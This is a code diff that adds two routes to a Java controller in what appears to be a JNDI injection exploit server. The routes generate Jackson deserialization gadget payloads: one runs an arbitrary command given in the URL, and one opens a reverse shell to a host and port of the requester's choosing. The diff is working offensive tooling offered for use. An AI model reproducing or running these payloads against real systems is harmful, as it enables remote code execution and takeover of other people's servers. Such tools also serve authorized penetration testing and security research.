@@ -115,4 +115,22 @@ public class DeserializeController implements Controller {
         byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
         return data;
     }
+
+    @JNDIMapping("/Jackson/Command/{cmd}")
+    public byte[] JacksonCmd(String cmd) throws Exception {
+        System.out.println("[Deserialize] [Jackson] [Command] Cmd: " + cmd);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
+        byte[] data = Jackson.create(templatesImpl);
+        return data;
+    }
+
+    @JNDIMapping("/Jackson/ReverseShell/{host}/{port}")
+    public byte[] JacksonReverseShell(String host, String port) throws Exception {
+        System.out.println("[Deserialize] [Jackson] [ReverseShell] Host: " + host + " Port: " + port);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
+        byte[] data = Jackson.create(templatesImpl);
+        return data;
+    }
 }
